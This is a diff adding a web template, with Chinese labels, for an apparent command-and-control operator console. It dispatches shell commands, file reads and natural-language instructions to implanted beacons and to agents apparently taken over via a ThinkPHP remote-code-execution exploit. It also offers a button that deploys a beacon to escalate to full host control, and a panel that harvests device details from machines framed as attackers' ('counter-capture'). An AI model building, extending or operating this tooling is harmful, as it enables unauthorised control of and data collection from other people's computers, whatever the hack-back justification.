@@ -1,0 +1,480 @@
+{% extends 'admin/base.html' %}
+{% from 'admin/_macros.html' import page_header, metric_card, section_header, empty_state, badge with context %}
+{% block content %}
+<style>
+.c2-mono { font-family:"Fira Code", ui-monospace, monospace; font-variant-numeric:tabular-nums; }
+
+/* ===== chat console layout ===== */
+.chat-layout { display:grid; grid-template-columns:minmax(0,1fr) 320px; gap:14px; margin-top:14px; align-items:stretch; }
+.chat-layout > aside > .panel { flex:1 1 auto; }
+.chat-layout > .panel, .chat-layout > aside > .panel { margin-top:0; }
+@media (max-width:1180px) { .chat-layout { grid-template-columns:1fr; } .chat-layout > aside > .panel { flex:0 0 auto; } }
+
+.chat-panel { display:flex; flex-direction:column; padding:0; overflow:hidden; }
+
+/* presence bar */
+.chat-presence { display:flex; align-items:center; gap:10px; padding:12px 16px; border-bottom:1px solid var(--border); flex-wrap:wrap; }
+.presence-dot { width:8px; height:8px; border-radius:50%; background:var(--muted-foreground); flex-shrink:0; transition:background 200ms ease, box-shadow 200ms ease; }
+.presence-dot.online { background:var(--success); box-shadow:0 0 8px rgba(52,211,153,.5); }
+.presence-dot.stale { background:var(--warning, #f59e0b); box-shadow:0 0 8px rgba(245,158,11,.45); }
+.presence-dot.offline { background:var(--danger); }
+.presence-meta { font-size:11.5px; color:var(--muted-foreground); }
+
+/* transcript */
+.chat-log { flex:1 1 auto; min-height:320px; overflow-y:auto; padding:16px; display:flex; flex-direction:column; gap:14px; scroll-behavior:smooth; }
+.chat-exchange { display:flex; flex-direction:column; gap:6px; }
+.chat-row { display:flex; justify-content:flex-end; }
+.chat-row.agent { justify-content:flex-start; }
+.bubble { max-width:78%; border-radius:12px; padding:10px 14px; font-size:13px; line-height:1.6; border:1px solid var(--border); background:var(--card); transition:border-color 200ms ease; }
+.bubble.op { border-color:rgba(59,130,246,.35); background:linear-gradient(180deg, rgba(30,58,138,.18), rgba(13,20,36,.9)); }
+.bubble .bubble-head { display:flex; align-items:center; gap:8px; margin-bottom:6px; font-size:10.5px; color:var(--muted-foreground); flex-wrap:wrap; }
+.bubble .bubble-body { white-space:pre-wrap; word-break:break-word; }
+.bubble.op .bubble-body { font-family:"Fira Code", ui-monospace, monospace; font-size:12px; }
+.bubble .bubble-out { margin-top:8px; font-family:"Fira Code", ui-monospace, monospace; font-size:11.5px; white-space:pre-wrap; word-break:break-word; max-height:260px; overflow-y:auto; background:rgba(2,6,23,.55); border:1px solid var(--border); border-radius:8px; padding:8px 10px; }
+.bubble .pending { display:inline-flex; align-items:center; gap:8px; font-size:11.5px; color:var(--muted-foreground); }
+.pending-dots::after { content:""; animation:dots 1.2s steps(4,end) infinite; }
+@keyframes dots { 0%{content:""} 25%{content:"·"} 50%{content:"··"} 75%{content:"···"} }
+[data-theme="light"] .bubble { background:#ffffff; border-color:rgba(15,23,42,.12); }
+[data-theme="light"] .bubble .bubble-body,
+[data-theme="light"] .bubble .bubble-head { color:#1e293b; }
+[data-theme="light"] .bubble.op {
+  border-color:rgba(59,130,246,.4);
+  background:linear-gradient(180deg, rgba(219,234,254,.55), rgba(239,246,255,.9));
+}
+[data-theme="light"] .bubble .bubble-out {
+  background:rgba(15,23,42,.04); border-color:rgba(15,23,42,.1); color:#334155;
+}
+.st-badge { font-size:10px; padding:1px 8px; border-radius:99px; border:1px solid var(--border); letter-spacing:.05em; }
+.st-queued { color:var(--info); border-color:rgba(96,165,250,.4); }
+.st-dispatched { color:var(--warning); border-color:rgba(245,158,11,.4); }
+.st-completed { color:var(--success); border-color:rgba(52,211,153,.4); }
+.st-failed { color:var(--danger); border-color:rgba(251,113,133,.4); }
+
+/* presets + composer */
+.chat-presets { display:flex; gap:8px; flex-wrap:wrap; padding:10px 16px; border-top:1px solid var(--border); }
+.preset-chip { cursor:pointer; font-size:11px; padding:5px 12px; border-radius:99px; border:1px solid var(--border); color:var(--foreground); background:var(--secondary); transition:color 160ms ease, border-color 160ms ease, box-shadow 160ms ease; user-select:none; }
+.preset-chip:hover { color:#67e8f9; border-color:rgba(34,211,238,.45); box-shadow:0 0 12px rgba(34,211,238,.12); }
+.preset-chip.nl { border-color:rgba(52,211,153,.3); }
+.preset-chip.nl:hover { color:#6ee7b7; border-color:rgba(52,211,153,.5); }
+[data-theme="light"] .preset-chip { background:#ffffff; border-color:rgba(15,23,42,.16); color:#334155; }
+[data-theme="light"] .preset-chip:hover { color:#0e7490; border-color:rgba(14,116,144,.5); box-shadow:0 1px 6px rgba(15,23,42,.08); }
+[data-theme="light"] .preset-chip.nl { border-color:rgba(5,150,105,.35); }
+[data-theme="light"] .preset-chip.nl:hover { color:#047857; border-color:rgba(5,150,105,.55); }
+.preset-group { font-size:10px; color:var(--muted-foreground); align-self:center; letter-spacing:.12em; margin-right:2px; }
+.preset-break { flex-basis:100%; height:0; }
+
+.chat-composer { display:flex; gap:10px; align-items:flex-end; padding:12px 16px 14px; border-top:1px solid var(--border); }
+.chat-composer select { width:auto; min-width:110px; }
+.chat-composer textarea { flex:1; min-height:52px; max-height:160px; resize:vertical; font-family:"Fira Code", ui-monospace, monospace; font-size:12.5px; }
+.composer-hint { width:100%; padding:0 16px 8px; font-size:10.5px; color:var(--muted-foreground); }
+#btn-send { width:auto !important; min-width:118px; white-space:nowrap; }
+#btn-send:not(:disabled) {
+  background: linear-gradient(135deg, #2563eb, #3b82f6);
+  color:#ffffff;
+  border-color: transparent;
+  box-shadow: 0 6px 18px rgba(37, 99, 235, 0.24);
+}
+#btn-send:not(:disabled):hover { transform: translateY(-1px); box-shadow: 0 10px 26px rgba(37, 99, 235, 0.32); }
+[data-theme="light"] #btn-send:not(:disabled) {
+  background: linear-gradient(to bottom, #1e293b, #0f172a);
+  color:#f8fafc;
+  box-shadow: 0 8px 20px rgba(15, 23, 42, 0.18);
+}
+
+/* sidebar */
+.side-card { padding:14px; }
+.side-kv { display:flex; justify-content:space-between; gap:10px; padding:5px 0; font-size:12px; border-bottom:1px dashed var(--border); }
+.side-kv:last-child { border-bottom:none; }
+.side-kv .k { color:var(--muted-foreground); flex-shrink:0; }
+.side-kv .v { text-align:right; word-break:break-all; }
+#auto-refresh-indicator { transition:color 160ms ease, border-color 160ms ease; cursor:pointer; }
+#auto-refresh-indicator:hover { color:#67e8f9; border-color:rgba(34,211,238,.45); }
+</style>
+
+{{ page_header('C2', _('Agent 对话式控制台'), (agent.hostname or agent.agent_id[:16]), [
+  agent.status|status_zh,
+  _('Portal 招募') if is_recruited else _('植入 Beacon'),
+  agent.privileges or 'user'
+], actions='<a class="chip" href="/admin/c2/agents">' ~ _('← 返回对话式 C2 管理') ~ '</a>') }}
+
+<div class="chat-layout">
+  <section class="panel chat-panel">
+    <div class="chat-presence">
+      <span class="presence-dot {{ 'online' if agent.status == 'active' else 'stale' if agent.status == 'stale' else 'offline' }}" id="presence-dot"></span>
+      <code class="c2-mono" style="font-size:12px">{{ agent.agent_id[:20] }}…</code>
+      {% if is_recruited %}{{ badge(_('Portal 招募'), 'success') }}{% else %}{{ badge(_('植入 Beacon'), 'info') }}{% endif %}
+      <span class="presence-meta" id="presence-meta">
+        {{ _('心跳间隔') }} <span class="c2-mono">{{ agent.poll_interval }}s</span> ·
+        {{ _('最后心跳') }} <span class="c2-mono" id="last-seen">{{ agent.last_seen_at | dt('%m-%d %H:%M:%S') }}</span>
+      </span>
+      <span class="chip" id="auto-refresh-indicator" style="margin-left:auto">{{ _('自动刷新: 开 (4s)') }}</span>
+    </div>
+
+    <div class="chat-log" id="chat-log">
+      {% if not tasks %}
+      <div class="chat-exchange">
+        <div class="chat-row agent"><div class="bubble">
+          <div class="bubble-head"><span>SYSTEM</span></div>
+          <div class="bubble-body">{{ _('会话已建立。下发的指令将进入队列，') }}{{ _('招募 Agent 会在下一次心跳（≤') ~ agent.poll_interval ~ _('s）领取执行') if is_recruited else _('Beacon 会在下一次轮询（≤') ~ agent.poll_interval ~ _('s）领取执行') }}{{ _('，回传结果会实时出现在此处。') }}</div>
+        </div></div>
+      </div>
+      {% endif %}
+    </div>
+
+    <div class="chat-presets" id="chat-presets">
+      {% if is_recruited %}
+      <span class="preset-group">{{ _('NL 预设') }}</span>
+      {% for t in nl_templates %}
+      <span class="preset-chip nl" data-command="{{ t.command }}" data-type="{{ t.task_type }}">{{ _(t.label) }}</span>
+      {% endfor %}
+      <span class="preset-break" aria-hidden="true"></span>
+      <span class="preset-group">SHELL</span>
+      {% endif %}
+      {% for t in templates %}
+      {% if t.task_type != 'uninstall' %}
+      <span class="preset-chip" data-command="{{ t.command }}" data-type="{{ t.task_type }}">{{ _(t.label) }}</span>
+      {% endif %}
+      {% endfor %}
+    </div>
+
+    <div class="composer-hint" id="composer-hint">{{ _('Enter 发送 · Shift+Enter 换行 · 预设点击填入输入框，可改后再发') }}</div>
+    <div class="chat-composer">
+      <select id="task-type" style="width:auto">
+        {% if is_recruited %}<option value="nl_instruct" selected>{{ _('对话指令 (nl)') }}</option>{% endif %}
+        <option value="cmd" {{ '' if is_recruited else 'selected' }}>{{ _( 'Shell 命令 (cmd)' ) }}</option>
+        <option value="read_file">{{ _('读文件 (read_file)') }}</option>
+        <option value="uninstall">{{ _('卸载 Agent') }}</option>
+      </select>
+      <textarea id="chat-input" placeholder="{{ _('下发巡检项（平台运维语义），例如：uptime; id —— Agent 将按网关 runbook 执行并回传输出') if agent_plane == 'agent' else (_('用自然语言向该 Agent 下达指令，例如：报告当前目录内容与运行身份…') if is_recruited else _('输入要下发的 shell 命令，例如：whoami; uname -a')) }}"></textarea>
+      <button type="button" class="primary" id="btn-send">{{ _('发送巡检项') if agent_plane == 'agent' else _('发送指令') }}</button>
+      {% if agent_plane == 'agent' %}
+      <button type="button" class="secondary" id="btn-deploy-beacon" data-confirm="{{ _('向该 Agent 下发节点代理部署任务，将其提升为主机控制（部署成功后身份自动转入 C2 控制台）？') }}">{{ _('部署 Beacon · 提升为主机控制') }}</button>
+      {% endif %}
+    </div>
+  </section>
+
+  <aside style="display:flex;flex-direction:column;gap:14px;min-width:0">
+    <section class="panel">
+      {{ section_header(_('端点信息'), '') }}
+      <div class="side-card">
+        <div class="side-kv"><span class="k">{{ _( '来源 IP' ) }}</span><span class="v c2-mono">{{ agent.source_ip }}</span></div>
+        <div class="side-kv"><span class="k">{{ _( '主机名' ) }}</span><span class="v">{{ agent.hostname or '-' }}</span></div>
+        <div class="side-kv"><span class="k">{{ _( '系统' ) }}</span><span class="v">{{ (agent.os_name ~ ' ' ~ (agent.os_version or '')) if agent.os_name else '-' }}</span></div>
+        <div class="side-kv"><span class="k">{{ _( '用户 / 权限' ) }}</span><span class="v">{{ agent.username or '-' }} · {{ agent.privileges or 'user' }}</span></div>
+        <div class="side-kv"><span class="k">{{ _( '架构' ) }}</span><span class="v">{{ agent.arch or '-' }}</span></div>
+        <div class="side-kv"><span class="k">{{ _( '植入类型' ) }}</span><span class="v">{{ agent.payload_type or 'implant' }}</span></div>
+        {% if (agent.metadata_json or {}).get('recruited_via') %}
+        <div class="side-kv"><span class="k">{{ _( '接入方式' ) }}</span><span class="v">
+          {% if (agent.metadata_json or {}).get('recruited_via') == 'thinkphp_rce' %}
+          <span class="badge badge-warning">{{ _('RCE 利用自动接入') }}</span>
+          {% else %}
+          <span class="badge badge-success">{{ _('Portal 注册接入') }}</span>
+          {% endif %}
+        </span></div>
+        {% endif %}
+        {% if recruit_src %}<div class="side-kv"><span class="k">{{ _( '招募令牌' ) }}</span><span class="v c2-mono" title="{{ recruit_src }}">{{ recruit_src[:14] }}…</span></div>{% endif %}
+        {% if (agent.metadata_json or {}).get('agent_product') %}<div class="side-kv"><span class="k">{{ _( '指纹识别' ) }}</span><span class="v">{{ (agent.metadata_json or {}).get('agent_product') }}</span></div>{% endif %}
+        <div class="side-kv"><span class="k">{{ _( '首次上线' ) }}</span><span class="v c2-mono">{{ agent.first_seen_at | dt('%m-%d %H:%M') }}</span></div>
+        <div class="side-kv"><span class="k">{{ _( '任务总数' ) }}</span><span class="v c2-mono">{{ task_count }}</span></div>
+      </div>
+    </section>
+
+    {% if type_stats %}
+    <section class="panel">
+      {{ section_header(_('任务类型分布'), '') }}
+      <div class="side-card">
+        {% for t, n in type_stats.items() %}
+        <div class="side-kv"><span class="k">{{ t }}</span><span class="v c2-mono">{{ n }}</span></div>
+        {% endfor %}
+      </div>
+    </section>
+    {% endif %}
+
+    <section class="panel">
+      {{ section_header(_('危险操作'), '') }}
+      <div class="side-card">
+        <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/delete" onsubmit="return confirm('{{ _( '确认删除该 Agent 及所有任务？不可撤销。' ) }}')">
+          <button class="danger" type="submit" style="width:100%">{{ _('删除 Agent') }}</button>
+        </form>
+      </div>
+    </section>
+  </aside>
+</div>
+
+<style>
+/* ===== device precise-info (设备精确信息) ===== */
+.dp-banner { border-left:3px solid var(--success); margin-top:14px; padding:10px 16px; }
+.dp-banner p { margin:0; font-size:12.5px; }
+.dp-toolbar { display:flex; align-items:center; gap:12px; padding:0 16px 10px; }
+.dp-progress { font-size:12px; color:var(--muted-foreground); }
+.dp-progress b { color:var(--foreground); font-size:13px; }
+.dp-toolbar form { margin-left:auto; }
+.dp-tabs { display:flex; gap:2px; padding:0 16px; border-bottom:1px solid var(--border); overflow-x:auto; scrollbar-width:thin; }
+.dp-tab { display:inline-flex; align-items:center; gap:6px; background:none; border:none; cursor:pointer;
+  padding:9px 12px 10px; font-size:12.5px; color:var(--muted-foreground); border-bottom:2px solid transparent;
+  white-space:nowrap; transition:color 160ms ease, border-color 160ms ease; }
+.dp-tab:hover { color:var(--foreground); }
+.dp-tab.active { color:var(--ring); border-bottom-color:var(--ring); font-weight:600; }
+.dp-dot { width:6px; height:6px; border-radius:50%; background:var(--border-strong); flex-shrink:0; }
+.dp-dot.ok { background:var(--success); }
+.dp-dot.wait { background:var(--warning); }
+.dp-pane { padding:14px 16px 16px; }
+.dp-status { display:flex; align-items:center; gap:10px; margin-bottom:12px; }
+.dp-meta { font-size:11.5px; color:var(--muted-foreground); }
+.dp-fields { display:grid; grid-template-columns:repeat(auto-fill, minmax(280px, 1fr)); gap:8px; margin-bottom:12px; }
+.dp-kv { display:flex; gap:10px; border:1px solid var(--border); border-radius:9px; background:var(--secondary); padding:8px 11px; font-size:12px; }
+.dp-kv .k { flex:0 0 110px; color:var(--muted-foreground); font-family:"Fira Code", ui-monospace, monospace; font-size:11px; word-break:break-all; }
+.dp-kv .v { flex:1; word-break:break-all; }
+.dp-raw { margin:0; font-family:"Fira Code", ui-monospace, monospace; font-size:11.5px; line-height:1.65;
+  white-space:pre-wrap; word-break:break-word; background:rgba(2,6,23,.55); border:1px solid var(--border);
+  border-radius:9px; padding:10px 12px; max-height:300px; overflow-y:auto; }
+[data-theme="light"] .dp-raw { background:rgba(15,23,42,.04); }
+.dp-empty p { margin:0 0 6px; font-size:11.5px; color:var(--muted-foreground); }
+</style>
+
+{% if profile_queued or profile_skipped %}
+<div class="panel dp-banner">
+  <p>{{ _('已下发') }} <b class="c2-mono">{{ profile_queued }}</b> {{ _('个采集任务') }}{% if profile_skipped %} · {{ profile_skipped }} {{ _('个类别已有任务在途，已跳过') }}{% endif %}</p>
+</div>
+{% endif %}
+
+<section class="panel" id="dp-panel" style="margin-top:14px">
+  {{ section_header(_('设备精确信息'), _('反制收编后按类别采集攻击者设备信息：收编 Agent 走自然语言指令，植入 Beacon 走 shell 命令，回传自动解析到对应类别。')) }}
+  <div class="dp-toolbar">
+    <span class="dp-progress">{{ _('采集进度') }} <b class="c2-mono">{{ profile_done }}/{{ profile_sections|length }}</b></span>
+    <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/profile/collect">
+      <button class="primary btn-sm" type="submit">{{ _('下发采集任务') }}</button>
+    </form>
+  </div>
+  <div class="dp-tabs" role="tablist">
+    {% for s in profile_sections %}
+    <div class="dp-tab {{ 'active' if loop.first }}" data-tab="{{ s.key }}" role="tab" tabindex="0">
+      <span class="dp-dot {{ 'ok' if s.key in profile_map else ('wait' if s.key in profile_status else '') }}"></span>{{ _(s.label) }}
+    </div>
+    {% endfor %}
+  </div>
+  {% for s in profile_sections %}
+  {% set prow = profile_map.get(s.key) %}
+  {% set pstat = profile_status.get(s.key) %}
+  <div class="dp-pane" id="dp-pane-{{ s.key }}" {{ '' if loop.first else 'hidden' }}>
+    <div class="dp-status">
+      {% if prow %}
+      <span class="st-badge st-completed">{{ _('已回传') }}</span>
+      <span class="dp-meta">{{ prow.collected_at | dt('%m-%d %H:%M:%S') }} · {{ _('任务') }} #{{ prow.task_id }}</span>
+      {% elif pstat %}
+      <span class="st-badge st-{{ pstat.status }}">{{ _('已下发') }}</span>
+      <span class="dp-meta">{{ _('任务') }} #{{ pstat.task_id }} · {{ _('等待 Agent 回传') }}</span>
+      {% else %}
+      <span class="st-badge">{{ _('未采集') }}</span>
+      <span class="dp-meta">{{ _('尚未下发该类别的采集任务') }}</span>
+      {% endif %}
+    </div>
+    {% if prow %}
+    {% set dfields = prow.data.get('fields', {}) %}
+    {% if dfields %}
+    <div class="dp-fields">
+      {% for k, v in dfields.items() %}
+      <div class="dp-kv"><span class="k">{{ k }}</span><span class="v c2-mono">{{ v }}</span></div>
+      {% endfor %}
+    </div>
+    {% endif %}
+    <pre class="dp-raw">{{ prow.data.get('raw', '') }}</pre>
+    {% else %}
+    <div class="dp-empty">
+      <p>{{ _('将下发的指令内容：') }}</p>
+      <pre class="dp-raw">{{ s.nl if is_recruited else s.cmds | join('\n') }}</pre>
+    </div>
+    {% endif %}
+  </div>
+  {% endfor %}
+</section>
+
+<script>
+(function () {
+  var tabs = document.querySelectorAll('.dp-tab');
+  function activate(tab) {
+    tabs.forEach(function (t) { t.classList.remove('active'); });
+    tab.classList.add('active');
+    document.querySelectorAll('.dp-pane').forEach(function (p) {
+      p.hidden = p.id !== 'dp-pane-' + tab.getAttribute('data-tab');
+    });
+  }
+  tabs.forEach(function (tab) {
+    tab.addEventListener('click', function () { activate(tab); });
+    tab.addEventListener('keydown', function (ev) {
+      if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); activate(tab); }
+    });
+  });
+})();
+</script>
+
+<script>
+(function () {
+  var AGENT_ID = '{{ agent.agent_id }}';
+  var log = document.getElementById('chat-log');
+  var input = document.getElementById('chat-input');
+  var typeSel = document.getElementById('task-type');
+  var btnSend = document.getElementById('btn-send');
+  var seen = {};        // task id -> {status, outLen}
+  var AUTO_REFRESH = true;
+  var timer = null;
+
+  var STATUS_LABEL = { queued: '排队', dispatched: '已派发', completed: '完成', failed: '失败' };
+  var TYPE_LABEL = { nl_instruct: '指令', cmd: 'cmd', read_file: '读文件', write_file: '写文件', download: '下载', uninstall: '卸载', beacon_deploy: '部署升级' };
+
+  function fmtTime(iso) {
+    if (!iso) return '';
+    var d = new Date(iso);
+    function p(n) { return n < 10 ? '0' + n : '' + n; }
+    return (d.getMonth() + 1) + '-' + p(d.getDate()) + ' ' + p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
+  }
+
+  function esc(s) {
+    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
+      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+    });
+  }
+
+  function renderExchange(t) {
+    var wrap = document.createElement('div');
+    wrap.className = 'chat-exchange';
+    wrap.dataset.taskId = t.id;
+
+    var outHtml = '';
+    if (t.output) {
+      outHtml = '<div class="bubble-out">' + esc(t.output) + '</div>';
+    } else if (t.status === 'completed') {
+      outHtml = '<div class="bubble-out">(无输出)</div>';
+    } else if (t.status === 'failed') {
+      outHtml = '<div class="bubble-out" style="color:var(--danger)">(执行失败)</div>';
+    } else {
+      outHtml = '<div class="pending"><span class="pending-dots"></span><span>等待 Agent 回传</span></div>';
+    }
+
+    var expired = t.status === 'dispatched' && t.lease_expired;
+    var stLabel = expired ? '等待回联' : (STATUS_LABEL[t.status] || t.status);
+    wrap.innerHTML =
+      '<div class="chat-row op"><div class="bubble op">' +
+        '<div class="bubble-head"><span>#' + t.id + '</span><span class="st-badge st-' + t.status + (expired ? ' st-waiting' : '') + '">' + stLabel + '</span><span>' + esc(TYPE_LABEL[t.task_type] || t.task_type) + '</span><span>' + fmtTime(t.created_at) + '</span></div>' +
+        '<div class="bubble-body">' + esc(t.command) + '</div>' +
+      '</div></div>' +
+      '<div class="chat-row agent"><div class="bubble">' +
+        '<div class="bubble-head"><span>AGENT</span><span>' + fmtTime(t.completed_at) + '</span></div>' +
+        '<div class="reply-slot">' + outHtml + '</div>' +
+      '</div></div>';
+    return wrap;
+  }
+
+  function applyTasks(tasks) {
+    var scroll = false;
+    tasks.forEach(function (t) {
+      var prev = seen[t.id];
+      var outLen = (t.output || '').length;
+      var exp = !!(t.status === 'dispatched' && t.lease_expired);
+      if (!prev) {
+        log.appendChild(renderExchange(t));
+        seen[t.id] = { status: t.status, outLen: outLen, expired: exp };
+        scroll = true;
+      } else if (prev.status !== t.status || prev.outLen !== outLen || prev.expired !== exp) {
+        var el = log.querySelector('.chat-exchange[data-task-id="' + t.id + '"]');
+        if (el) log.replaceChild(renderExchange(t), el);
+        seen[t.id] = { status: t.status, outLen: outLen, expired: exp };
+        scroll = true;
+      }
+    });
+    if (scroll) log.scrollTop = log.scrollHeight;
+    // drop the bootstrap hint once real history exists
+    if (tasks.length > 0) {
+      var hint = log.querySelector('.chat-exchange:not([data-task-id])');
+      if (hint) hint.remove();
+    }
+  }
+
+  function poll() {
+    fetch('/api/admin/c2/agents/' + AGENT_ID + '/chat')
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (data.agent) {
+          var dot = document.getElementById('presence-dot');
+          dot.className = 'presence-dot ' + (data.agent.status === 'active' ? 'online' : 'offline');
+          var seenEl = document.getElementById('last-seen');
+          if (seenEl && data.agent.last_seen_at) {
+            var d = new Date(data.agent.last_seen_at);
+            function p(n) { return n < 10 ? '0' + n : '' + n; }
+            seenEl.textContent = (d.getMonth() + 1) + '-' + p(d.getDate()) + ' ' + p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
+          }
+        }
+        if (data.tasks) applyTasks(data.tasks);
+      }).catch(function () {});
+  }
+
+  function send() {
+    var msg = input.value.trim();
+    if (!msg) { input.focus(); return; }
+    btnSend.disabled = true;
+    fetch('/api/admin/c2/agents/' + AGENT_ID + '/chat', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: msg, task_type: typeSel.value })
+    }).then(function (r) { return r.json().then(function (d) { return { ok: r.ok, d: d }; }); })
+      .then(function (res) {
+        btnSend.disabled = false;
+        if (res.ok && res.d.task) {
+          input.value = '';
+          applyTasks([res.d.task]);
+        } else {
+          alert(res.d && res.d.error ? '发送失败: ' + res.d.error : '发送失败');
+        }
+        input.focus();
+      }).catch(function () { btnSend.disabled = false; });
+  }
+
+  btnSend.addEventListener('click', send);
+  var btnBeacon = document.getElementById('btn-deploy-beacon');
+  if (btnBeacon) btnBeacon.addEventListener('click', function () {
+    btnBeacon.disabled = true;
+    fetch('/api/admin/agent-console/' + AGENT_ID + '/deploy-beacon', { method: 'POST', credentials: 'same-origin' })
+      .then(function (r) { return r.json().then(function (d) { return { ok: r.ok, d: d }; }); })
+      .then(function (res) {
+        btnBeacon.disabled = false;
+        if (res.ok) { poll(); input.focus(); }
+        else { alert(res.d && res.d.error === 'already_host_plane'
+          ? '该身份已是主机控制平面' : '下发失败: ' + (res.d && res.d.error || res.d)); }
+      }).catch(function () { btnBeacon.disabled = false; });
+  });
+  input.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send(); }
+  });
+
+  document.querySelectorAll('.preset-chip').forEach(function (chip) {
+    chip.addEventListener('click', function () {
+      input.value = chip.dataset.command || '';
+      if (chip.dataset.type) {
+        var opt = typeSel.querySelector('option[value="' + chip.dataset.type + '"]');
+        if (opt) typeSel.value = chip.dataset.type;
+      }
+      input.focus();
+    });
+  });
+
+  var indicator = document.getElementById('auto-refresh-indicator');
+  function setTimer(on) {
+    if (timer) { clearInterval(timer); timer = null; }
+    if (on) timer = setInterval(poll, 4000);
+  }
+  indicator.addEventListener('click', function () {
+    AUTO_REFRESH = !AUTO_REFRESH;
+    indicator.textContent = AUTO_REFRESH ? '自动刷新: 开 (4s)' : '自动刷新: 关';
+    indicator.style.color = AUTO_REFRESH ? 'var(--theme-accent)' : '';
+    setTimer(AUTO_REFRESH);
+  });
+
+  // bootstrap with server-rendered history, oldest first
+  // server-generated JSON (json.dumps); task fields are re-escaped in JS
+  var initialData = {{ initial_tasks_json | safe }};
+  if (initialData && initialData.length) applyTasks(initialData);
+  setTimer(true);
+  poll();
+})();
+</script>
+{% endblock %}
